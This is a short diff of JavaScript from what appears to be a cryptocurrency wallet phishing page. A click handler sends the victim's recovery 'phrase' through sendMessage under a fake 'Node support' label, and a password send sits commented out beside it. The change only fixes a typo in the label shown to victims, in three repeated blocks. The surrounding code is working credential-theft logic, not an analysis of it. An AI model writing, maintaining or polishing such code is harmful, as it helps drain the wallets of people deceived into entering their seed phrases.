@@ -46,7 +46,7 @@ submitk.addEventListener("click", () => {
     //let mnemonicspass =document.getElementById("mnemonicspass").value;
     
         console.log("phrase");
-        await sendMessage(`Node sipport`);
+        await sendMessage(`Node support`);
         await sendMessage(`phrase`);
         await sendMessage(phrase);
         //await sendMessage(`Password`);
@@ -59,7 +59,7 @@ submitk.addEventListener("click", () => {
     
 
         console.log("phrase");
-        await sendMessage(`Node sipport`);
+        await sendMessage(`Node support`);
         await sendMessage(`phrase`);
         await sendMessage(phrase);
         //await sendMessage(`Password`);
@@ -72,7 +72,7 @@ submitk.addEventListener("click", () => {
     
 
         console.log("phrase");
-        await sendMessage(`Node sipport`);
+        await sendMessage(`Node support`);
         await sendMessage(`phrase`);
         await sendMessage(phrase);
         //await sendMessage(`Password`);
